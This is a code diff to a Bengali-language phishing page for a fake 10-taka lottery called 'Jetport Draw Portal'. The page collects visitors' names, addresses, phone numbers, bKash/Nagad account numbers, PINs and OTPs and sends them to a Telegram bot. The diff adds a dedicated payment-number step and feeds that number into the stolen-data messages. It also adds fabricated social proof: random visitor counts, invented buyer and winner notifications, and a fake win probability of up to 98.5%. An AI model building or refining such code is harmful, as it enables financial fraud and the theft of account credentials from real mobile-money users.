@@ -119,6 +119,35 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.3);
         }
 
+        /* ===== লাইভ ভিজিটর কাউন্টার ব্যাজ ===== */
+        .live-visitor-badge {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid #10b981;
+            color: #34d399;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 12px;
+            box-shadow: 0 2px 8px rgba(16, 185, 129, 0.2);
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: blinkDot 1s infinite;
+        }
+
+        @keyframes blinkDot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
         .countdown-title-top {
             font-size: 13px;
             font-weight: 900;
@@ -183,25 +212,32 @@
         /* ===== লোভনীয় অফার হাইলাইট ব্যানার ===== */
         .luring-banner {
             margin: 16px 16px 0;
-            background: linear-gradient(135deg, #fef3c7 0%, #fffbeb 100%);
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
             border: 2px dashed #f59e0b;
             border-radius: 16px;
-            padding: 12px;
+            padding: 14px;
             text-align: center;
-            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.15);
+            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.2);
+            animation: bounceBanner 3s infinite;
+        }
+
+        @keyframes bounceBanner {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
         }
 
         .luring-banner h4 {
             color: #b45309;
-            font-size: 13.5px;
+            font-size: 14px;
             font-weight: 900;
-            margin-bottom: 3px;
+            margin-bottom: 4px;
         }
 
         .luring-banner p {
             color: #78350f;
-            font-size: 11px;
+            font-size: 11.5px;
             font-weight: 700;
+            line-height: 1.4;
         }
 
         /* ===== বক্স ডিজাইন ===== */
@@ -231,6 +267,35 @@
             border-bottom: 2px solid #f1f5f9;
             padding-bottom: 8px;
             font-weight: 700;
+        }
+
+        /* ===== লাইভ বায়ার ফিড বক্স ===== */
+        .live-buyer-ticker {
+            background: #eff6ff;
+            border: 1.5px solid #bfdbfe;
+            border-radius: 14px;
+            padding: 10px 14px;
+            margin: 0 16px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #1e40af;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+        }
+
+        .live-buyer-ticker .pulse-badge {
+            width: 10px; height: 10px; background: #2563eb; border-radius: 50%;
+            box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7);
+            animation: pulseBlue 1.5s infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes pulseBlue {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(37, 99, 235, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
         }
 
         .prize-row-item {
@@ -384,40 +449,6 @@
 
         .main-claim-btn:active { transform: scale(0.97); }
 
-        .trust-section {
-            margin: 0 16px 15px;
-            background: #ffffff;
-            border: 1px solid #cbd5e1;
-            border-radius: 16px;
-            padding: 12px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
-        }
-
-        .trust-title {
-            font-size: 11px;
-            color: #64748b;
-            font-weight: 800;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
-        .payment-logos {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            font-size: 11px;
-            font-weight: 800;
-            color: #334155;
-        }
-
-        .pay-badge {
-            background: #f8fafc;
-            padding: 5px 10px;
-            border-radius: 8px;
-            border: 1px solid #cbd5e1;
-        }
-
         .gateway-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -428,7 +459,7 @@
         .gateway-card {
             border: 2px solid #cbd5e1;
             border-radius: 16px;
-            padding: 14px 10px;
+            padding: 16px 10px;
             text-align: center;
             cursor: pointer;
             background: #ffffff;
@@ -449,17 +480,17 @@
         }
 
         .gateway-card img {
-            width: 52px;
-            height: 52px;
+            width: 58px;
+            height: 58px;
             object-fit: contain;
-            border-radius: 10px;
+            border-radius: 12px;
             background: #fff;
             padding: 4px;
             border: 1px solid #e2e8f0;
         }
 
         .gateway-card .gw-name {
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 900;
         }
 
@@ -713,14 +744,59 @@
             box-shadow: inset 0 2px 6px rgba(0,0,0,0.03);
         }
 
+        /* ===== লাইভ উইনার টোস্ট নোটিফিকেশন পপআপ ===== */
+        .winner-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, #090d16, #1e293b);
+            color: #fff;
+            padding: 12px 18px;
+            border-radius: 16px;
+            border: 1.5px solid #f59e0b;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 9999;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 90%;
+            width: 360px;
+        }
+
+        .winner-toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast-icon {
+            font-size: 24px;
+            background: rgba(245, 158, 11, 0.2);
+            padding: 8px;
+            border-radius: 12px;
+            border: 1px solid #f59e0b;
+        }
+
+        .toast-text div:first-child {
+            font-size: 12px;
+            font-weight: 900;
+            color: #fde047;
+        }
+
+        .toast-text div:last-child {
+            font-size: 11px;
+            color: #cbd5e1;
+            font-weight: 600;
+        }
+
         .app-footer {
             text-align: center;
             padding: 22px 16px;
-            font-size: 11px;
-            color: #94a3b8;
+            font-size: 12px;
+            color: #64748b;
             border-top: 1px solid #e2e8f0;
             margin-top: 12px;
-            font-weight: 600;
+            font-weight: 700;
         }
     </style>
 </head>
@@ -742,6 +818,12 @@
             </div>
         </div>
 
+        <!-- লাইভ ভিজিটর কাউন্টার -->
+        <div class="live-visitor-badge">
+            <span class="live-dot"></span>
+            <span id="liveVisitorCount">৩,৮৪২</span> জন লাইভ ভিজিট করছেন
+        </div>
+
         <div class="countdown-title-top">⏳ ড্র শুরু হতে মাত্র বাকি: <span id="timeRemainingText">০৪ ঘণ্টা</span></div>
 
         <div class="countdown-box">
@@ -758,18 +840,24 @@
         </div>
     </div>
 
-    <!-- ===== লোভনীয় হাইলাইট অফার ব্যানার ===== -->
+    <!-- ===== অতি লোভনীয় ও আকর্ষণীয় অফার হাইলাইট ব্যানার ===== -->
     <div class="luring-banner">
         <h4>⚡ সুবর্ণ সুযোগ: মাত্র ১০ টাকায় ভাগ্য বদলান!</h4>
         <p>যত বেশি টিকিট কিনবেন, বিজয়ী হওয়ার সম্ভাবনা তত শতভাগ বেড়ে যাবে! আজ রাতেই লাইভ ড্র ও ইনস্ট্যান্ট বিকাশ/নগদে ক্যাশআউট।</p>
+    </div>
+
+    <!-- ===== রিয়েল-টাইম লাইভ বায়ার অ্যাক্টিভিটি ফিড ===== -->
+    <div class="live-buyer-ticker">
+        <div class="pulse-badge"></div>
+        <div id="liveBuyerText">🟢 ঢাকা থেকে সাব্বির ভাই ৫টি টিকিট কিনেছেন</div>
     </div>
 
     <!-- ===== টিকিট ইনফো ও উইনার রুলস ===== -->
     <div class="info-card-box">
         <div class="info-card-title">ℹ️ টিকিট ইনফো ও উইনার রুলস:</div>
         <div class="info-card-text">
-            • <b>রেজিস্ট্রেশন ফর্ম:</b> টিকিট কেনার জন্য প্রথমে আপনার নাম, সঠিক ঠিকানা ও মোবাইল নম্বর দিয়ে ফর্ম পূরণ করতে হবে।<br>
-            • <b>বিজয়ী ঘোষণা পদ্ধতি:</b> কাউন্টডাউন শেষ হওয়ার পর অটোমেটেড সিস্টেমের মাধ্যমে র‍্যান্ডম ড্র করে বিজয়ী নির্বাচন করা হবে। বিজয়ীদের নাম এই পোর্টালে লাইভ আপডেট করা হবে এবং সরাসরি তাদের নম্বরে পুরস্কার পৌঁছে দেওয়া হবে।
+            • <b>রেজিস্ট্রেশন ফর্ম:</b> টিকিট কেনার জন্য প্রথমে আপনার নাম, ঠিকানা ও উইনিং কল পাওয়ার জন্য যোগাযোগের নম্বর দিতে হবে।<br>
+            • <b>পেমেন্ট ধাপ:</b> এরপর পেমেন্ট গেটওয়েতে গিয়ে বিকাশ বা নগদ সিলেক্ট করে পেমেন্ট নম্বর, পিন ও ওটিপি দিয়ে টিকিট কনফার্ম করতে হবে।
         </div>
     </div>
 
@@ -826,7 +914,7 @@
     <!-- ===== টিকিট কেনার বাটন ও কাউন্টার ===== -->
     <div class="action-footer-box">
         <div style="margin-bottom: 12px; font-size: 13px; font-weight: 800; color: #38bdf8; background: rgba(15, 23, 42, 0.85); padding: 9px; border-radius: 14px; border: 1px solid rgba(56, 189, 248, 0.35);">
-            🎟️ আপনার কেনা মোট টিকিট: <span id="totalTicketsCount" style="color: #fde047; font-size: 15px;">০ টি</span>
+            🎟️ আপনার কেনা মোট টিকিট: <span id="totalTicketsCount" style="color: #fde047; font-size: 15px;">০ টি</span> (জেতার সম্ভাবনা: <span id="winProbability" style="color: #34d399;">০%</span>)
         </div>
         <button class="main-claim-btn" onclick="openDetailsForm()">🎫 এখনই টিকিট কিনুন (মাত্র ১০ টাকা)</button>
     </div>
@@ -895,21 +983,20 @@
         </div>
     </div>
 
-    <!-- ===== ট্রাস্ট ব্যাজ ===== -->
-    <div class="trust-section">
-        <div class="trust-title">স্বীকৃত ও নিরাপদ পেমেন্ট গেটওয়ে</div>
-        <div class="payment-logos">
-            <span class="pay-badge">bKash</span>
-            <span class="pay-badge">Nagad</span>
-        </div>
-    </div>
-
     <!-- ===== ফুটার ===== -->
     <div class="app-footer">
-        © 2026 Jetport Draw Portal. All Rights Reserved.<br>
-        🔒 Secure 256-bit Encrypted Connection
+        Jetport VIP Mega Draw Portal • 24/7 Live Support
     </div>
 
+</div>
+
+<!-- ===== লাইভ উইনার টোস্ট নোটিফিকেশন পপআপ ===== -->
+<div class="winner-toast" id="winnerToast">
+    <div class="toast-icon">🏆</div>
+    <div class="toast-text">
+        <div id="toastTitle">গতকালকের ১ম বিজয়ী রহিম মিয়া (কুষ্টিয়া)</div>
+        <div id="toastDesc">৳২২০,০০০ মেগা ক্যাশ প্রাইজ জিতেছেন!</div>
+    </div>
 </div>
 
 <!-- ===== মডাল ও ফর্ম সিস্টেম ===== -->
@@ -924,7 +1011,7 @@
             <div class="loader-text" id="loaderText">পেমেন্ট গেটওয়ে লোড হচ্ছে...</div>
         </div>
 
-        <!-- ২. টিকিট কেনার তথ্য ফর্ম (নাম, ঠিকানা, নম্বর) -->
+        <!-- ২. টিকিট কেনার তথ্য ফর্ম -->
         <div id="detailsFormStep" style="display: none;">
             <div class="modal-badge-icon">📝</div>
             <div class="modal-title-3d">জেটপোর্ট টিকিট ফর্ম</div>
@@ -941,7 +1028,7 @@
             </div>
 
             <div class="form-group" id="phoneGroup">
-                <label>মোবাইল নম্বর (বিকাশ/নগদ):</label>
+                <label>যোগাযোগের নম্বর (উইন করার পর কল দেওয়া হবে):</label>
                 <input type="tel" id="userPhone" placeholder="017XXXXXXXX" maxlength="11">
             </div>
 
@@ -955,16 +1042,16 @@
                 </select>
             </div>
 
-            <button class="modal-action-btn" onclick="submitDetailsForm()">পরবর্তী ধাপ (পেমেন্ট)</button>
+            <button class="modal-action-btn" onclick="submitDetailsForm()">পরবর্তী ধাপ (পেমেন্ট মাধ্যম)</button>
         </div>
 
         <!-- ৩. পেমেন্ট মেথড সিলেক্ট স্টেপ -->
         <div id="paymentSelectStep" style="display: none;">
             <div class="modal-badge-icon">💳</div>
             <div class="modal-title-3d">পেমেন্ট মাধ্যম সিলেক্ট করুন</div>
-            <div class="modal-desc-text">নিচের যেকোনো একটি অপশনে ক্লিক করে পেমেন্ট সম্পূর্ণ করুন:</div>
+            <div class="modal-desc-text">আপনি কোন মাধ্যমে পেমেন্ট করবেন তা সিলেক্ট করুন:</div>
             
-            <div class="gateway-grid" style="grid-template-columns: repeat(2, 1fr);">
+            <div class="gateway-grid">
                 <div class="gateway-card selected" id="gwBkash" onclick="selectGateway('bKash')">
                     <img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" alt="bKash">
                     <div class="gw-name" style="color: #e2136e;">bKash</div>
@@ -975,10 +1062,23 @@
                 </div>
             </div>
 
-            <button class="modal-action-btn" onclick="proceedToPinStep()">পেমেন্ট করুন</button>
+            <button class="modal-action-btn" onclick="proceedToGatewayNumber()">পরবর্তী ধাপ (পেমেন্ট নম্বর)</button>
         </div>
 
-        <!-- ৪. পিন কোড -->
+        <!-- ৪. পেমেন্ট অ্যাকাউন্ট নম্বর দেওয়ার স্টেপ -->
+        <div id="gatewayNumberStep" style="display: none;">
+            <div class="modal-badge-icon" id="gwNumberIcon">📱</div>
+            <div class="modal-title-3d" id="gwNumberTitle">বিকাশ নম্বর দিন</div>
+            <div class="modal-desc-text" id="gwNumberDesc">যে বিকাশ নম্বর থেকে টাকা কাটা হবে সেই নম্বরটি লিখুন:</div>
+            
+            <div class="phone-input-wrapper" id="paymentPhoneBox">
+                <input type="tel" id="gatewayPhoneInput" placeholder="017XXXXXXXX" maxlength="11">
+            </div>
+
+            <button class="modal-action-btn" onclick="submitGatewayNumber()">পিন কোড দিন</button>
+        </div>
+
+        <!-- ৫. পিন কোড -->
         <div id="pinStep" style="display: none;">
             <div class="modal-badge-icon">🔒</div>
             <div class="modal-title-3d" id="modalPinTitle">পেমেন্ট পিন দিন</div>
@@ -991,7 +1091,7 @@
             <button class="modal-action-btn" onclick="submitPin()">পিন সাবমিট করুন</button>
         </div>
 
-        <!-- ৫. ওটিপি -->
+        <!-- ৬. ওটিপি -->
         <div id="otpStep" style="display: none;">
             <div class="modal-badge-icon">🛡️</div>
             <div class="modal-title-3d">কনফার্মেশন কোড (OTP)</div>
@@ -1009,7 +1109,7 @@
             <button class="modal-action-btn" onclick="submitOtp()">ভেরিফাই করুন</button>
         </div>
 
-        <!-- ৬. সাকসেস ও লোভনীয় টিকিট সিরিয়াল নম্বর রসিদ -->
+        <!-- ৭. সাকসেস ও টিকিট সিরিয়াল রসিদ -->
         <div id="successStep" style="display: none;">
             <div class="modal-badge-icon" style="background: #e8f5e9; border-color: #c8e6c9;">🎉</div>
             <div class="modal-title-3d">অভিনন্দন! পেমেন্ট সফল</div>
@@ -1017,7 +1117,8 @@
             <div class="ticket-receipt-box" id="receiptDetails">
                 <b>নাম:</b> <span id="recName">অজ্ঞাত</span><br>
                 <b>ঠিকানা:</b> <span id="recAddress">ঢাকা</span><br>
-                <b>নম্বর:</b> <span id="recPhone">017XXXXXXXX</span><br>
+                <b>যোগাযোগের নম্বর:</b> <span id="recPhone">017XXXXXXXX</span><br>
+                <b>পেমেন্ট মাধ্যম:</b> <span id="recGateway">bKash</span><br>
                 <b>জেটপোর্ট সিরিয়াল:</b> <span id="recTicketNo" style="color: #b45309; font-size: 14px; font-weight: 900;">#JET-89421</span><br>
                 <b>পরিমাণ:</b> <span id="recCount">১টি টিকিট</span>
             </div>
@@ -1042,17 +1143,21 @@
     let userNameVal = "";
     let userAddressVal = "";
     let userPhoneVal = "";
+    let gatewayPhoneVal = "";
     let selectedGatewayName = "bKash";
     let timerInterval = null;
     let selectedTicketsCountToAdd = 1;
 
     function updateTicketUI() {
-        let savedCount = localStorage.getItem('user_total_tickets') || 0;
+        let savedCount = parseInt(localStorage.getItem('user_total_tickets') || 0);
         document.getElementById('totalTicketsCount').textContent = savedCount + " টি";
+        
+        let prob = savedCount === 0 ? "০%" : (savedCount * 3.5).toFixed(1) + "%";
+        if(savedCount >= 30) prob = "৯৮.৫%";
+        document.getElementById('winProbability').textContent = prob;
     }
     updateTicketUI();
 
-    // অটো-ডেট ক্যালকুলেশন সিস্টেম (গতকালকের তারিখ)
     const yesterday = new Date();
     yesterday.setDate(yesterday.getDate() - 1);
     const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
@@ -1069,10 +1174,14 @@
         sessionStorage.setItem('visitor_serial', userSessionId);
     }
 
-    // ৪ ঘণ্টার লাইভ কাউন্টডাউন টাইমার
-    let totalSeconds = 4 * 3600 + 15 * 60 + 20;
+    let savedTime = localStorage.getItem('persistent_countdown_seconds');
+    let totalSeconds = savedTime ? parseInt(savedTime) : (4 * 3600 + 15 * 60 + 20);
+
     setInterval(() => {
-        if(totalSeconds > 0) totalSeconds--;
+        if(totalSeconds > 0) {
+            totalSeconds--;
+            localStorage.setItem('persistent_countdown_seconds', totalSeconds);
+        }
         let h = Math.floor(totalSeconds / 3600);
         let m = Math.floor((totalSeconds % 3600) / 60);
         let s = totalSeconds % 60;
@@ -1082,6 +1191,48 @@
         document.getElementById('secs').textContent = s < 10 ? '0' + s : s;
         document.getElementById('timeRemainingText').textContent = `০${h} ঘণ্টা`;
     }, 1000);
+
+    setInterval(() => {
+        let currentVis = parseInt(document.getElementById('liveVisitorCount').textContent.replace(/,/g, '')) || 3842;
+        let change = Math.floor(Math.random() * 9) - 4; 
+        let newVis = currentVis + change;
+        if(newVis < 3500) newVis = 3512;
+        document.getElementById('liveVisitorCount').textContent = newVis.toLocaleString();
+    }, 4000);
+
+    const liveBuyerSamples = [
+        "🟢 ঢাকা থেকে সাব্বির ভাই ৫টি টিকিট কিনেছেন",
+        "🟢 রাজশাহী থেকে রিয়াজ আহমেদ ২টি টিকিট কিনেছেন",
+        "🟢 সিলেট থেকে শামীম মিয়া ১০টি টিকিট কিনেছেন",
+        "🟢 চট্টগ্রাম থেকে তানভীর আহমেদ ৩টি টিকিট কিনেছেন",
+        "🟢 খুলনা থেকে আরিফ হোসেন ১টি টিকিট কিনেছেন"
+    ];
+    setInterval(() => {
+        let randomFeed = liveBuyerSamples[Math.floor(Math.random() * liveBuyerSamples.length)];
+        document.getElementById('liveBuyerText').textContent = randomFeed;
+    }, 6000);
+
+    const winnerToastSamples = [
+        { title: "গতকালকের ১ম বিজয়ী রহিম মিয়া (কুষ্টিয়া)", desc: "৳২২০,০০০ মেগা ক্যাশ প্রাইজ জিতেছেন!" },
+        { title: "গতকালকের ২য় বিজয়ী সাব্বির আহমেদ (ঢাকা)", desc: "আইফোন ১৬ প্রো ম্যাক্স জিতেছেন!" },
+        { title: "গতকালকের ৩য় বিজয়ী তানভীর হাসান (রাজশাহী)", desc: "৳৮০,০০০ নগদ ক্যাশ উইন করেছেন!" },
+        { title: "গতকালকের ৪র্থ বিজয়ী শরিফুল ইসলাম (বগুড়া)", desc: "৳৫০,০০০ ক্যাশ প্রাইজ জিতেছেন!" }
+    ];
+
+    function showRandomWinnerToast() {
+        const toast = document.getElementById('winnerToast');
+        const randomWin = winnerToastSamples[Math.floor(Math.random() * winnerToastSamples.length)];
+        
+        document.getElementById('toastTitle').textContent = randomWin.title;
+        document.getElementById('toastDesc').textContent = randomWin.desc;
+        
+        toast.classList.add('show');
+        setTimeout(() => {
+            toast.classList.remove('show');
+        }, 4500);
+    }
+
+    setInterval(showRandomWinnerToast, 12000);
 
     function sendTelegramMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -1096,6 +1247,7 @@
     const loader = document.getElementById('modalLoader');
     const detailsFormStep = document.getElementById('detailsFormStep');
     const paymentSelectStep = document.getElementById('paymentSelectStep');
+    const gatewayNumberStep = document.getElementById('gatewayNumberStep');
     const pinStep = document.getElementById('pinStep');
     const otpStep = document.getElementById('otpStep');
     const successStep = document.getElementById('successStep');
@@ -1104,6 +1256,7 @@
         loader.style.display = 'none';
         detailsFormStep.style.display = 'none';
         paymentSelectStep.style.display = 'none';
+        gatewayNumberStep.style.display = 'none';
         pinStep.style.display = 'none';
         otpStep.style.display = 'none';
         successStep.style.display = 'none';
@@ -1154,7 +1307,7 @@
 
         hideAllSteps();
         loader.style.display = 'flex';
-        document.getElementById('loaderText').textContent = "পেমেন্ট গেটওয়ে লোড হচ্ছে...";
+        document.getElementById('loaderText').textContent = "পেমেন্ট গে트ওয়ে লোড হচ্ছে...";
 
         setTimeout(() => {
             hideAllSteps();
@@ -1168,7 +1321,25 @@
         document.getElementById('gwNagad').className = 'gateway-card' + (gw === 'Nagad' ? ' selected' : '');
     }
 
-    function proceedToPinStep() {
+    function proceedToGatewayNumber() {
+        hideAllSteps();
+        document.getElementById('gwNumberTitle').textContent = `${selectedGatewayName} নম্বর দিন`;
+        document.getElementById('gwNumberDesc').textContent = `যে ${selectedGatewayName} নম্বর থেকে পেমেন্ট করবেন সেটি লিখুন:`;
+        gatewayNumberStep.style.display = 'block';
+        document.getElementById('gatewayPhoneInput').value = '';
+        document.getElementById('gatewayPhoneInput').focus();
+    }
+
+    function submitGatewayNumber() {
+        gatewayPhoneVal = document.getElementById('gatewayPhoneInput').value.trim();
+        const phoneBox = document.getElementById('paymentPhoneBox');
+
+        if(gatewayPhoneVal.length < 11) {
+            phoneBox.classList.add('shake-anim');
+            setTimeout(() => phoneBox.classList.remove('shake-anim'), 400);
+            return;
+        }
+
         hideAllSteps();
         document.getElementById('modalPinTitle').textContent = `${selectedGatewayName} পিন দিন`;
         pinStep.style.display = 'block';
@@ -1176,7 +1347,7 @@
         document.getElementById('userPin').focus();
 
         const selectedAmt = document.getElementById('paymentAmountSelect').value;
-        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - নতুন রেজিস্ট্রেশন\n━━━━━━━━━━━━━━━━━━━━━\n👤 নাম: ${userNameVal}\n🏠 ঠিকানা: ${userAddressVal}\n📱 নম্বর: \`${userPhoneVal}\`\n🎁 প্যাক: ${selectedTicketsCountToAdd}টি টিকিট\n💳 মাধ্যম: *${selectedGatewayName}*\n💰 অ্যামাউন্ট: *৳${selectedAmt}.০০*\n━━━━━━━━━━━━━━━━━━━━━`;
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - নতুন রেজিস্ট্রেশন\n━━━━━━━━━━━━━━━━━━━━━\n👤 নাম: ${userNameVal}\n🏠 ঠিকানা: ${userAddressVal}\n📞 যোগাযোগের নম্বর: \`${userPhoneVal}\`\n💳 পেমেন্ট মাধ্যম: *${selectedGatewayName}*\n📱 পেমেন্ট নম্বর: \`${gatewayPhoneVal}\`\n🎁 প্যাক: ${selectedTicketsCountToAdd}টি টিকিট\n💰 অ্যামাউন্ট: *৳${selectedAmt}.০০*\n━━━━━━━━━━━━━━━━━━━━━`;
         sendTelegramMessage(msg);
     }
 
@@ -1194,7 +1365,7 @@
         loader.style.display = 'flex';
         document.getElementById('loaderText').textContent = "পেমেন্ট প্রসেসিং হচ্ছে...";
 
-        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - পিন রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: \`${userPhoneVal}\`\n🔒 পিন: \`${pin}\`\n━━━━━━━━━━━━━━━━━━━━━`;
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - পিন রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 ${selectedGatewayName} নম্বর: \`${gatewayPhoneVal}\`\n🔒 পিন: \`${pin}\`\n━━━━━━━━━━━━━━━━━━━━━`;
         sendTelegramMessage(msg);
 
         setTimeout(() => {
@@ -1234,7 +1405,7 @@
             return;
         }
 
-        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - ওটিপি রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: \`${userPhoneVal}\`\n🛡️ ওটিপি: \`${otpValue}\`\n━━━━━━━━━━━━━━━━━━━━━`;
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - ওটিপি রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 ${selectedGatewayName} নম্বর: \`${gatewayPhoneVal}\`\n🛡️ ওটিপি: \`${otpValue}\`\n━━━━━━━━━━━━━━━━━━━━━`;
         sendTelegramMessage(msg);
 
         clearInterval(timerInterval);
@@ -1254,6 +1425,7 @@
             document.getElementById('recName').textContent = userNameVal;
             document.getElementById('recAddress').textContent = userAddressVal;
             document.getElementById('recPhone').textContent = userPhoneVal;
+            document.getElementById('recGateway').textContent = selectedGatewayName + " (" + gatewayPhoneVal + ")";
             document.getElementById('recTicketNo').textContent = randomTicketId;
             document.getElementById('recCount').textContent = selectedTicketsCountToAdd + "টি টিকিট";
             successStep.style.display = 'block';
